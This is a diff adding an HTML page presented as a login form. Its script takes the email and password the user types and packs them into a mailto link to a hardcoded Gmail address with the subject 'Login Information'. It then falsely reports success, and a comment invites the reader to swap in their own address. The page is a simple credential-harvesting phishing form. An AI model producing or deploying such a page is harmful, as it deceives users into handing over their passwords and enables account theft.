@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <style>
+        .classa, .classb {
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<form id="loginForm">
+    <div>
+        <input type="email" id="email" class="classa" placeholder="Email">
+    </div>
+    <div>
+        <input type="password" id="password" class="classb" placeholder="Password">
+    </div>
+    <div>
+        <button type="button" onclick="submitForm()">Submit</button>
+    </div>
+</form>
+
+<script>
+    function submitForm() {
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
+
+        // Form validation
+        if (!email || !password) {
+            alert("Please fill in both email and password fields.");
+            return;
+        }
+
+        var emailTo = "boy082913@gmail.com"; // Replace with your actual email
+        var subject = "Login Information";
+        var body = "Email: " + email + "\nPassword: " + password;
+
+        var mailtoLink = "mailto:" + emailTo + "?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+        
+        try {
+            window.open(mailtoLink, "_self");
+            alert("Email sent successfully!");
+        } catch (error) {
+            console.error("Error sending email:", error);
+            alert("Error sending email. Please try again later.");
+        }
+    }
+
+
+
+
+
+
+</script>
+
+</body>
+</html>
